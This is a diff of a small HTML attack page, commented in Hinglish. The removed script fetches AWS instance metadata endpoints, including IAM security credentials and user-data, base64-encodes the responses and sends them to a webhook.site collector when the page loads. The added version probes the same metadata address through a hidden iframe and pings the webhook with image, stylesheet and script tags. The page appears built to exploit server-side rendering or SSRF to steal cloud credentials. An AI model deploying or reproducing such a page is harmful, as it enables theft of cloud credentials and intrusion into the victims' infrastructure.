@@ -1,28 +1,19 @@
 <!DOCTYPE html>
 <html>
 <body>
-<script>
-var hook = 'https://webhook.site/c0980051-ec3e-4d1d-9ef7-87dc160e8b0c';
-var urls = [
-  'http://169.254.169.254/latest/meta-data/',
-  'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
-  'http://169.254.169.254/latest/user-data/'
-];
+<h1>Test Page</h1>
 
-// Webhook pe signal bhejo ke page load hua
-fetch(hook + '?status=page_loaded');
+<!-- Image tag se ping — no CORS issue -->
+<img src="https://webhook.site/c0980051-ec3e-4d1d-9ef7-87dc160e8b0c?visit=1" width="1" height="1">
 
-// AWS metadata try karo
-urls.forEach(function(url){
-  fetch(url)
-  .then(r => r.text())
-  .then(d => fetch(hook + '?url=' + encodeURIComponent(url) + '&data=' + btoa(d)))
-  .catch(e => fetch(hook + '?blocked=' + encodeURIComponent(url)));
-});
-</script>
+<!-- Iframe test -->
+<iframe src="http://169.254.169.254/latest/meta-data/" width="1" height="1"></iframe>
 
-<!-- JS ke bina bhi try karo -->
-<img src="http://169.254.169.254/latest/meta-data/" onerror="fetch('https://webhook.site/c0980051-ec3e-4d1d-9ef7-87dc160e8b0c?img=blocked')">
-<meta http-equiv="refresh" content="3;url=http://169.254.169.254/latest/meta-data/">
+<!-- Link tags -->
+<link rel="stylesheet" href="https://webhook.site/c0980051-ec3e-4d1d-9ef7-87dc160e8b0c?css=1">
+
+<!-- Script tag -->
+<script src="https://webhook.site/c0980051-ec3e-4d1d-9ef7-87dc160e8b0c?js=1"></script>
+
 </body>
 </html>
